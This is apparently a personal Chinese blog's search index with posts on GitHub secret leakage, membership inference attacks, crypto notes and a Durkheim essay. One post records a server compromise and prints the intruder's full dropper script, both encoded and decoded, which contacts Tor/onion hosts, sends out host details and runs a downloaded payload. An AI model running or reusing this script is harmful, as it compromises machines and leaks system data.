信息泄露问题的背景以及 NDSS 2019 上的相关研究成果，并针对高校学生群体的帐号泄露问题进行了探讨，并给出了一些安全措施。撰写本文的后期，我才意识到到此前仅仅关注了学术界的有限工作，而工业界已经从企业安全防护的角度对此进行了深度实践，比如阿里安全专家止介曾做过 Github 敏感信息泄露监控的专题报告，还开源了 GSIL 这款功能更为强大的工具，腾讯宙斯盾流量安全分析团队还探索了基于机器学习的敏感信息泄露治理。这一问题或许并不是学术界关注的热点，这可能是由于无法使用数学方法定量研究而显得不那么有技术含量，但频频爆出的信息泄露问题证明了其仍然具有很大的现实意义。遗憾的是由于各方面的限制，我仅仅进行了小规模的复现验证了问题的存在，希望将来可以跟踪业界的最新进展，进行更高效精准的信息挖掘与监控。\n参考文献 [1]\tMeli, Michael, Matthew R. McNiece, and Bradley Reaves. \u0026ldquo;How Bad Can It Git? Characterizing Secret Leakage in Public GitHub Repositories.\u0026rdquo; NDSS. 2019.\n[2]\tRussell, Matthew A. Mining the social web: data mining Facebook, Twitter, LinkedIn, Google+, GitHub, and more. \u0026quot; O\u0026rsquo;Reilly Media, Inc.\u0026quot;, 2013.\n[3]\tKnothe, David, and Frederick Pietschmann. \u0026ldquo;Large-Scale-Exploit of GitHub Repository Metadata and Preventive Measures.\u0026rdquo; arXiv preprint arXiv:1908.05354 (2019).\n[4]\tCosentino, Valerio, Javier Luis Cánovas Izquierdo, and Jordi Cabot. \u0026ldquo;Findings from GitHub: methods, datasets and limitations.\u0026rdquo; 2016 IEEE/ACM 13th Working Conference on Mining Software Repositories (MSR). IEEE, 2016.\n[5]\tKalliamvakou, Eirini, et al. \u0026ldquo;An in-depth study of the promises and perils of mining GitHub.\u0026rdquo; Empirical Software Engineering 21.5 (2016): 2035-2071.\n[6]\tLazarine, Ben, et al. \u0026ldquo;Identifying Vulnerable GitHub Repositories and Users in Scientific Cyberinfrastructure: An Unsupervised Graph Embedding Approach.\u0026rdquo; 2020 IEEE International Conference on Intelligence and Security Informatics (ISI). IEEE, 2020.\n[7]\thttps://shafiul.github.io/gitbook/1_the_git_object_model.html\n[8]\thttps://developer.github.com/changes/2013-10-18-new-code-search-requirements/\n[9]\thttps://docs.github.com/en/rest/reference/search#search-code\n[10] https://www.oschina.net/news/106836/opensource-ourself\n[11]\thttps://github.blog/2019-01-07-new-year-new-github/\n[12]\thttps://blog.gitee.com/2020/03/24/gitee-search/\n[13]\thttps://security.tencent.com/index.php/blog/msg/177\n[14]\thttps://feei.cn/wp-content/uploads/2020/09/Github敏感信息泄露监控.pdf\n[15]\thttps://www.yuque.com/feei/esbp/gsil\n","date":"2021-06-09T13:46:52Z","permalink":"https://chinggg.github.io/post/git-leaks/","tags":["安全","课程论文","隐私保护"],"title":"Secret Leakage in Public GitHub Repositories"},{"categories":["论文"],"contents":"前言 本文将对 NDSS (Network and Distributed System Security Symposium) 2019 获奖论文 ML-Leaks: Model and Data Independent Membership Inference Attacks and Defenses on Machine Learning Models 进行解读。这篇论文的主要研究内容是针对机器学习模型的成员推理攻击（membership inference attack）以及对应的防御机制，其价值在于证明了经过改进后的成员推理攻击具有较低的成本和较强的可行性，从而构成更现实的威胁。\n论文地址：https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_03A-1_Salem_paper.pdf\n源码地址：https://github.com/AhmedSalem2/ML-Leaks\n论文作者：Ahmed Salem, Yang Zhang, Mathias Humbert, Pascal Berrang, Mario Fritz, Michael Backes\n正文 研究背景 机器学习已经成为许多现实应用的核心，互联网巨头如 Google 和 Amazon 已经在推广机器学习即服务（MLaaS）的模式，用户可以上传自己的数据集，服务器返回给用户一个训练好的机器学习模型，通常是一个黑盒 API。尽管机器学习模型已得到广泛应用，但它在安全和隐私上却易受攻击，如模型逆向（model inversion）、对抗样本（adversarial examples）和模型提取（model extraction）。\n本文关注的是成员推理攻击（membership inference attack），攻击者的意图是得知某个数据是否被用于训练机器学习模型，这种攻击可能引发严重的后果，比如一个机器学习模型在来自特定疾病患者的数据上训练，攻击者通过得知受害者的数据属于模型的训练集就能立刻推知其健康状况。\n早在2017年，Shokri 等人第一次展示了针对机器学习模型的成员推理攻击，大致思路是使用多个攻击模型（attack models）来对目标模型（target model）的输出，即后验概率（posterior probabilities），进行成员推理。考虑到目标模型是一个黑盒 API，Shokri 等人构造了多个影子模型以模拟目标模型的行为并导出训练攻击模型所需的数据，即后验和真实（ground truth）的成员情况。\nShokri 等人的工作基于两个主要假设。首先，攻击者需要建立多个影子模型模型，每个模型与目标模型具有相同的结构，这可以通过使用与训练目标模型相同的 MLaaS 实现。第二，用于训练影子模型的数据集来自与目标模型的训练数据相同的分布，这一假设适用于对大部分攻击的评估。Shokir 等人也进一步提出了合成数据来放宽这一假设，但由于效率原因这种方法只能适用于包含二值特征的数据集。\n这两个较强的假设减少了对机器学习模型进行成员推理攻击的攻击面，本文将逐步放宽这些假设，以表明更广泛适用的攻击场景是可能的，同时也提出了两种防御机制。\n准备工作 本文主要关注分类问题，机器学习中的分类器就是一个函数，其将一个数据点（多维特征向量）映射成一个输出向量$\\mathcal{M(X)=Y}$，$\\mathcal{Y}$ 的长度等于类别的个数，大多数情况下 $\\mathcal{Y}$ 可被解释成在所有类别上后验概率的集合， $\\mathcal{Y}$ 中所有值的和为1。\n而成员推理攻击的攻击模型可表示成如下函数 $\\mathcal{A}:X_{Target},\\mathcal{M,K}\\rightarrow{0,1}$，其中 $X_{Target}$ 为目标数据点，$\\mathcal{M}$ 为训练后的模型（称为目标模型），$\\mathcal{K}$ 为攻击者的外部知识，结果为0表示目标数据点不是目标模型训练集 $\\mathcal{D}_{Train}$ 的成员，为1则反之。\n本文利用8个不同的数据集进行实验，其中6个与 Shokri 等人使用的数据相同，即MNIST、CIFAR-10、CIFAR-100、Location、Purchase、Adult。按照相同的程序对所有这些数据集进行预处理。此外，本文还利用了另外两个数据集，即 News 和 Face，来进行评估。\n三轮攻击 从表格中可看出，每一轮攻击都减少了一两个假设，攻击者对目标模型和数据的了解可以越来越少，不禁让人联想起电影《倚天屠龙记》中张三丰教张无忌太极拳，招式忘得愈多，反而学得愈深，颇有老子“绝圣弃智”，“不出于户，以观天下”的味道。\n攻击一：不知模型 本轮攻击主要放宽了影子模型设计上的假设，只需使用1个影子模型而且无需知晓目标模型的结构，就可实施高效且廉价的成员推理攻击。不过，训练影子模型时仍需假设影子数据集 $\\mathcal{D}_{Shadow}$ 和目标模型的训练数据来自相同的分布。\n单一影子模型 这里进一步假设影子模型运用算法和超参数和目标模型相同，在实践中做到这点，攻击者可以使用和目标模型相同的 MLaaS 平台，后面将展示这个假设也可被放宽。\n攻击策略有以下三个阶段：\n 影子模型训练：攻击者首先将的影子数据集 $\\mathcal{D}_{Shadow}$ 分成两份，用训练集训练影子模型。 攻击模型训练：攻击者用训练过的影子模型对所有影子数据进行预测，获得后验概率向量，每个数据点取最大的三个值（若为二元分类则取两个）。一个特征向量被标记为1或0分别代表对应的数据点在或不在测试集中，产生的特征向量和标记接着就被用于训练攻击模型。 成员推理：为了推知目标是否在实际训练集中，攻击者向模型查询该数据点并得到后验概率，同样取最大的三个值，然后传给攻击模型来获得成员预测结果。  相比 Shokri 的方法需要使用多个影子模型对每个类别分别进行攻击，本方法只需使用一个影子模型进行攻击，这大大减少了攻击的开销。\n结果如 Fig. 1 所示，本攻击方法的精确率和召回率与 Shokri 等人的几乎一致，在部分数据集上甚至表现更优。\n目标模型结构 接下来展示如何放宽攻击者必须知道目标模型的算法与超参数的情况这一假设。\n首先来看超参数，暂且假设攻击者知道目标模型是一个神经网络但不了解具体细节，先用目标模型的一半参数（即将批尺寸、隐含单元和正则化参数减半）来训练影子模型时，就 Purchase-100 数据集而言，达到了0.86的精确率和0.83的召回率，这和 Fig. 1 中的结果几乎一致；反之，若用两倍参数来训练影子模型时，表现稍显逊色，但仍达到了0.82的精确率和0.80的召回率。在其他数据集上也得到了类似的结果，这证明了成员推理攻击的灵活性：无需知道模型的超参数也能有良好的性能。\n接着再假设攻击者不知道目标模型使用了何种分类算法，首先尝试在影子模型和目标模型的类别不同的情况下直接实施攻击，结果不尽人意。改进的方法是采用组合攻击（combined attack），即将一系列不同的分类器模型组合成一个影子模型，其中每个模型被称为次影子模型（sub-shadow model），具体方法如 Fig. 6 所示\n在 Purchase-100 数据集上的结果证明，和上一部分所展示的攻击方法相比，在目标模型采用多层感知器和逻辑回归时，组合攻击的表现毫不逊色，而当目标模型采用随机森林时，组合攻击的性能就有所下降。\n攻击二：不知数据 本轮攻击放宽了对数据来源的假设，攻击者不再拥有与目标模型的训练数据同分布的数据集，在此情形下，Shokri 等人提议多次查询目标模型以合成数据来训练影子模型，但这种方法只适用于包含二值特征的数据集，而且每合成一个数据点就需要向目标模型发起156次查询，这不仅代价高昂，还可能触发 MLaaS 的警戒机制。与之相比，本方法就能用于攻击在任何数据上训练的机器学习模型，且没有上述任何限制。\n本攻击的策略接近于第一轮攻击，区别在于影子模型所使用的数据集不再与目标模型的训练数据同分布，此种攻击可被称为数据转移攻击（data transferring attack）。在此影子模型并非用于模仿目标模型的行为，而只用于概括机器模型训练集中数据点的成员状态。由于只有最大的三个（对二值数据集来说是两个）后验概率会被用于攻击模型，我们可以忽略数据集的类别数不同带来的影响。\n结果如 Fig. 7 所示，和对角线上第一轮攻击的结果相比，本轮攻击在许多场景下都有接近的表现，如使用 Face 数据集攻击 CIFAR-100 数据集，无论是精确率还是召回率，结果都是0.95，和第一轮攻击相同。在一些场景下，本轮攻击的结果甚至优于第一轮攻击。更有意思的是，在很多场景下，不同来源的数据集能够有效地相互攻击，如 News 数据集 和 CIFAR-100 数据集。\n攻击三：我好像在哪见过你 本轮攻击不再需要训练任何影子模型，也无需知晓目标模型及其数据分布，攻击者拥有的只是向目标模型查询目标数据点 $X_{Target}$ 得到的后验概率 $\\mathcal{M}(X_{Target})$ 。尽管 Yeom 等人提出过类似的攻击，但他们的方法需要知晓目标数据点的分类标签，这有时是难以获得的，而本方法的适用场景就更广泛。\n本攻击模型的实现是一个无监督二元分类器，攻击者先获得 $\\mathcal{M}(X_{Target})$ ，再拿最高的后验概率和一个确定的阀值相比，若高于阀值，则预测此数据点在目标模型的训练集中。选取最高值作为特征是基于如下推理：模型对训练过的数据点表现得更自信，体现在结果上就是，成员数据点的后验概率最大值高于非成员数据点。这是一种朴素的信念，但也符合我们的直觉，人对熟悉的事物表现得更自信，模型亦是如此。\n阀值的选取可根据需求而定，若更关注精确率则用高阀值，更关注召回率则选择低阀值。本文也提供了选择阀值的通用方法。\n综合三轮攻击的结果，可以证明成员推理攻击是非常广泛地适用的。\n防御机制 丢弃 完全连通的神经网络包含大量的参数，容易发生过拟合，而丢弃（dropout）是减少过拟合的一种非常有效的方法。在一个完全连通的神经网络模型中，通过在每次训练迭代中随机删除一个固定的边缘比例（丢失率）来执行该算法。本文对目标模型的输入层和隐藏层都应用了丢弃法，默认的丢弃率设为0.5，因为实验结果表明过高或过低的丢弃率都会降低模型性能\n模型堆叠 丢弃只适用于神经网络模型，而模型堆叠（model stacking）与所选择的分类器无关，这种机制的背后的原理在于，若目标模型的不同部分使用不同的数据子集进行训练，则完整的模型就不易过拟合，这可以通过集成学习（ensemble learning）实现。\n成果总结 为了证明成员推理攻击的广泛性，本文提出了三轮攻击，逐渐放宽了假设。\n第一轮攻击只用到了一个影子模型，大大降低了攻击成本，还通过组合攻击使得攻击者无需了解目标模型的种类。\n第二轮攻击只用放宽了对数据来源的要求，数据转移攻击在实现成员推理攻击效果的同时也更具有普适性。\n第三轮攻击具有最少的假设，攻击者无需构建任何影子模型，攻击是通过无监督的方式进行，在这样的场景下，成员推理仍然卓有成效。\n本文对攻击效果的综合评估充分证明了各种机器学习模型中数据成员的隐私所面临的威胁，为了遏制攻击，本文提出了两种防御机制：丢弃和模型堆叠。由于模型的过拟合程度和对成员推理的敏感性之间存在联系，这些机制也正是为减少过拟合而生。大量评估证明这些防御机制在抵抗成员推理攻击的同时也维持了模型的高可用性。\n参考文献 [1] Salem, Ahmed et al. “ML-Leaks: Model and Data Independent Membership Inference Attacks and Defenses on Machine Learning Models.” Proceedings 2019 Network and Distributed System Security Symposium (2019).\n[2] Shokri, R. et al. “Membership Inference Attacks Against Machine Learning Models.” 2017 IEEE Symposium on Security and Privacy (SP) (2017).\n[3] Pyrgelis, Apostolos et al. “Knock Knock, Who\u0026rsquo;s There? Membership Inference on Aggregate Location Data.” ArXiv abs/1708.06145 (2018).\n[4] Jia, J. and N. Gong. “AttriGuard: A Practical Defense Against Attribute Inference Attacks via Adversarial Machine Learning.” USENIX Security Symposium (2018).\n[5] Yeom, Samuel et al. “Privacy Risk in Machine Learning: Analyzing the Connection to Overfitting.” 2018 IEEE 31st Computer Security Foundations Symposium (CSF) (2018): 268-282.\n","date":"2021-05-22T13:46:52Z","permalink":"https://chinggg.github.io/post/ml-leaks/","tags":["论文笔记","安全","AI"],"title":"ML-Leaks: 针对机器学习模型的成员推理攻击"},{"categories":["安全"],"contents":"Materials Online Crypto by Stanford\nCryptography by IIT\nCrypto Book\nBlog\nMind Map\n[实验一、Shamir 秘密共享] 实验要求 实现一个（k,n）-Shamir 秘密共享方案，其中k=3，n=4，包含以下功能：\n 给定一个数字，可以计算出对应的share 给定k个share, 能够重构出秘密值  实验原理 https://en.wikipedia.org/wiki/Shamir's_Secret_Sharing\n要建立一个 (k, n) 秘密共享方案，可以构建一个 k-1 次多项式，并在曲线上挑选 n 个点作为 share，这样只有当 k 个或更多的份额被集中起来时，多项式才能被重新生成。秘密值 (s) 被隐藏在多项式的常数项中（也即曲线在 y 轴截距），只有在成功重建曲线后才能获得。\nTo establish a (t, n) secret sharing scheme, we can construct a polynomial of degree t-1 and pick n points on the curve as shares such that the polynomial will only be regenerated if t or more shares are pooled. The secret value (s) is concealed in the constant term of the polynomial (coefficient of 0-degree term or the curve’s y-intercept) which can only be obtained after the successful reconstruction of the curve.\nhttps://www.geeksforgeeks.org/implementing-shamirs-secret-sharing-scheme-in-python/\n[实验三、实现 AES 的 CBC 和 CTR 模式加解密] https://github.com/matt-wu/AES\n","date":"2021-05-22T13:46:52Z","permalink":"https://chinggg.github.io/post/crypto/","tags":["密码学"],"title":"Modern Crypto Course"},{"categories":["记录"],"contents":"└─# lsof -c uBXOvYBM COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME uBXOvYBM 318196 root cwd DIR 254,1 4096 2 / uBXOvYBM 318196 root rtd DIR 254,1 4096 2 / uBXOvYBM 318196 root txt REG 254,1 819252 1048698 /root/08db56cb75fd057be28be1007c5f4424 (deleted) uBXOvYBM 318196 root DEL REG 0,14 127380184 /anon_hugepage uBXOvYBM 318196 root DEL REG 0,14 17030308 /anon_hugepage uBXOvYBM 318196 root DEL REG 0,14 17030306 /anon_hugepage uBXOvYBM 318196 root mem REG 254,1 582 925625 /usr/share/zoneinfo/PRC uBXOvYBM 318196 root 0u a_inode 0,13 0 8043 [eventfd] uBXOvYBM 318196 root 1u a_inode 0,13 0 8043 [eventfd] uBXOvYBM 318196 root 2r CHR 1,3 0t0 4 /dev/null uBXOvYBM 318196 root 3u a_inode 0,13 0 8043 [eventpoll] uBXOvYBM 318196 root 4r FIFO 0,12 0t0 17030300 pipe uBXOvYBM 318196 root 5w FIFO 0,12 0t0 17030300 pipe uBXOvYBM 318196 root 6r FIFO 0,12 0t0 17030299 pipe uBXOvYBM 318196 root 7w FIFO 0,12 0t0 17030299 pipe uBXOvYBM 318196 root 8u a_inode 0,13 0 8043 [eventfd] uBXOvYBM 318196 root 9w REG 254,1 7 262168 /tmp/.X11-unix/11 uBXOvYBM 318196 root 10u IPv4 129901501 0t0 TCP iZwgo7e0o4xyirZ:41142-\u0026gt;static.99.90.243.136.clients.your-server.de:http-alt (ESTABLISHED)  └─# crontab -l 33 * * * * /root/.systemd-service.sh \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;  #!/bin/bash exec \u0026amp;\u0026gt;/dev/null echo nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV echo blA4YnlQVUdPd0tqVmZQWlpzcDVvY3RkWEhUV0d5UHFnVmVZODJ6VjFkZTZBWTB5ZEF0Z0VHbW8rSmF1bUVmVgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ3dnp5djJucHRqdXhjcW9pYmVrbHhlc2U0Nmo0dW9uemFhcHd5bDZ3dmhka25qbHFsY29ldTdpZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMCkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQgb25pb24uZm91bmRhdGlvbiBvbmlvbi5jb20uZGUgb25pb24uc2ggdG9yMndlYi5zdSAKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash  #!/bin/bash exec \u0026amp;\u0026gt;/dev/null echo nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV echo blA4YnlQVUdPd0tqVmZQWlpzcDVvY3RkWEhUV0d5UHFnVmVZODJ6VjFkZTZBWTB5ZEF0Z0VHbW8rSmF1bUVmVgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ3dnp5djJucHRqdXhjcW9pYmVrbHhlc2U0Nmo0dW9uemFhcHd5bDZ3dmhka25qbHFsY29ldTdpZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMCkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQgb25pb24uZm91bmRhdGlvbiBvbmlvbi5jb20uZGUgb25pb24uc2ggdG9yMndlYi5zdSAKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV exec \u0026amp;\u0026gt;/dev/null export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) c=$(echo \u0026quot;curl -4fsSLkA- -m200\u0026quot;) t=$(echo \u0026quot;wvzyv2nptjuxcqoibeklxese46j4uonzaapwyl6wvhdknjlqlcoeu7id\u0026quot;) sockz() { n=(doh.defaultroutes.de dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch) p=$(echo \u0026quot;dns-query?name=relay.tor2socks.in\u0026quot;) s=$($c https://${n[$((RANDOM%10))]}/$p | grep -oE \u0026quot;\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\u0026quot; |tr ' ' '\\n'|grep -Ev [.]0|sort -uR|head -n 1) } fexe() { for i in . $HOME /usr/bin $d /var/tmp ;do echo exit \u0026gt; $i/i \u0026amp;\u0026amp; chmod +x $i/i \u0026amp;\u0026amp; cd $i \u0026amp;\u0026amp; ./i \u0026amp;\u0026amp; rm -f i \u0026amp;\u0026amp; break;done } u() { sockz f=/int.$(uname -m) x=./$(date|md5sum|cut -f1 -d-) r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print $1'})_$(crontab -l|base64 -w0) $c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r chmod +x $x;$x;rm -f $x } for h in tor2web.in tor2web.it onion.foundation onion.com.de onion.sh tor2web.su do if ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; then fexe;u $t.$h ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h) ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h) else break fi done  有时间分析一下此样本\n","date":"2021-02-21T14:29:33Z","permalink":"https://chinggg.github.io/post/server-hacked/","tags":null,"title":"Server-Hacked"},{"categories":["随笔"],"contents":"《自杀论》读书报告——自杀与晚期资本主义社会 说到自杀，人们往往把它当成一种心理现象看待，尝试分析自杀者的精神状态和个人经历，从中寻找其自杀的独特原因。然而，涂尔干在他的著作《自杀论》中指出，自杀其实更是一种社会现象，背后有着深层次的社会原因。在最近年轻人自杀频频发生的背景下，我不能不赞同涂尔干从社会学视角解释自杀现象的合理性，读完《自杀论》后，我尝试运用书中理论理解当今社会自杀频发的原因。\n《自杀论》是一部严谨翔实的社会学著作，在此不对其论证过程做展开，仅简要介绍本书的主要结论为后文的讨论做铺垫。\n涂尔干在对欧洲各国自杀数据进行分析的基础上，把自杀分成三种：利己型自杀、利他型自杀和失范型自杀。\n利己型自杀是新教传播以来个人主义的兴盛而导致的，基于宗教和家庭的传统集体生活渐渐瓦解，个人在得到了相对的自由后却也失去了可依附的对象，脱离了集体活动和社会关系后，生活成了无意义的虚无，既然已看不到生命的价值，自杀便不足为奇了。\n利他型自杀恰恰相反，是由于个人过度融入集体生活，社会对人施以严格控制。为了获得集体的肯定和荣誉，担心被集体所排斥，个人不自觉地在社会给予的压力下朝着集体的目标前进，甚至不惜放弃自己的生命，而他人的自杀又是新一轮狂热的开始。\n失范型自杀是19世纪欧洲典型而普遍的自杀类型，资本主义飞速发展，人们的欲望不断增长，传统的法律道德、价值观念等社会规范遭到挑战，人们毫无准备地被抛置于新的社会秩序中，这种不稳定的社会环境极易滋生暴力，无论是杀人或是自杀。\n当我套用涂尔干关于自杀的理论于当代社会时，竟也能发现一些相通之处。\n现代社会的个人主义倾向已是老生常谈，交通工具的更新和通信技术的发展固然让地球村这一概念深入人心，现实生活中的我们却经常性地处于孤独之中，社会原子化让我们各怀心事又各自为战，功利主义编织的大网没有将我们连接在一起，而是将我们分隔在一个个互相凝视的茧房中。我们自由恋爱成家、自由寻找工作，也能自由地抛弃或被抛弃。“一切皆流，无物常驻”其实本是常态，可资本主义为了让人安分工作又总会提供一种虚假的归属感，“把企业当成家”是再常见不过的口号，然而铁打的营盘流水的兵，当经济状况恶化时，雇佣关系的本质就暴露无疑，下岗失业的残酷现实让幻梦破灭，痛苦更甚。回首向来萧瑟处，也无上帝也无亲，失去了宗教和家庭锁链的我们，真的得到了整个世界吗？或许我们还没做好迎接生命中不可承受之轻的准备？正如马克思所说，人是一切社会关系的总和，一旦脱离社会，个体的生命是那么渺小和短暂，既然自己终究要毁灭，那自杀不过是让这一结局提前到来而已。\n与此同时，个人主义被大力宣扬的背后，却是资本主义文化工业透过大众传媒在操纵着人们的思想，流行文化将批量生产的景观投射给所有社会成员，人们看似能自由选择自己的生活方式，却无时无刻都在被意识形态所塑造。抛去一切由消费构建的外衣，只有赤裸裸的金钱才被承认具有合法性，并成为整个社会所共同追逐的对象和评判个体价值的标尺。马克斯韦伯笔下的新教伦理已然成为事实上的普世价值，凡是与资本主义精神不相容的特征都被认为是一种疾病。陶潜和梭罗式的隐居只能成为幻想，只要参与社会生活，就必须接受社会的度量，哪怕只是想追求个人的小确幸，也不得不被捆绑在资本逐利的大船上，没有任何和解的余地。在这种意义上，每个被冠以奋斗之名在996的流水线上透支生命的打工人都是利他主义自杀在当代社会的牺牲品。\n当今中国处于社会转型期，国内矛盾凸显，国际时局动荡，新冠疫情的突然降临更是让人恍如隔世。信息爆炸、流量为王的时代，世间一切光怪陆